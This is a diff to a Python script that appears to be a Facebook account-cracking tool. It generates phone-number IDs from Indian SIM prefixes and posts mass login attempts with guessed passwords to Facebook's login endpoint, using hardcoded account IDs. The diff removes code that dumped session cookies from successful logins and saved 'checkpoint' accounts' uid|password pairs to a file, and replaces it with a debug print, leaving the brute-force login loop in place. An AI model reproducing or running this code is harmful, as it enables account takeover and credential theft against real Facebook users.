@@ -1,4 +1,4 @@
-#-------------------[ MAIN-CODE ]-------------------#
+ #-------------------[ MAIN-CODE ]-------------------#
 from os import path
 import requests,os
 os.system('')
@@ -65,7 +65,7 @@ def linex():
         print('\033[38;5;196m────────────────────────────────────────────\033[1;37m')
 #-----------------------[ MAIN-CODE ]-----------------------#
 sumon=[]
-def rndm():
+def rndm(): 
         clear()
         print(f'{K} SIM CODE  {R}:{G} +91637,+91620,+91935,+91701');linex()
         code = input(f'{K} CHOOSE  {R}:{G} ')
@@ -117,7 +117,7 @@ def _M1_(ids,pasx):
                         "li": re.search('name="li" value="(.*?)"', str(BLACKX)).group(1),
                         "try_number": 0,
                         "unrecognized_tries": 0,
-                        "email": '100080650416607',
+                        "email": '100062756363125',
                         "prefill_contact_point": "",
                         "prefill_source": "",
                         "prefill_type": "",
@@ -127,7 +127,7 @@ def _M1_(ids,pasx):
                         "had_password_prefilled": "false",
                         "is_smart_lock": "false",
                         "bi_xrwh": 0,
-                        "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], '620639'),
+                        "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], '620660'),
                         "bi_wvdp": "",
                         "fb_dtsg": "",
                         "jazoest": re.search('name="jazoest" value="(.*?)"', str(BLACKX)).group(1),
@@ -157,20 +157,7 @@ def _M1_(ids,pasx):
                         'sec-fetch-site': 'same-origin',
                         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
                         lo = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100',data=apple,headers=tedy).text
-                        BLACK=session.cookies.get_dict().keys()
-                        if 'c_user' in BLACK:
-                                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                                cok = Session.cookies.get_dict()
-                                cid = cok["c_user"]
-                                print(f"\r\033[38;5;46mCOOKIES=[🍪]: {coki}\33[1;36m")
-                               ######৳ print(f'\033[38;5;196m─────────────────────────────────────────────────\033[1;37m')
-                                break
-                        elif 'checkpoint' in BLACK:
-                                print(f'\r\r {R}[ATOM-CP] {uid} | {ps}')
-                                open('/sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'\n')
-                                cp.append(uid)
-                                break
-                        else:continue
+                        print(lo)
                 loop+=1
         except:pass
 #========================#
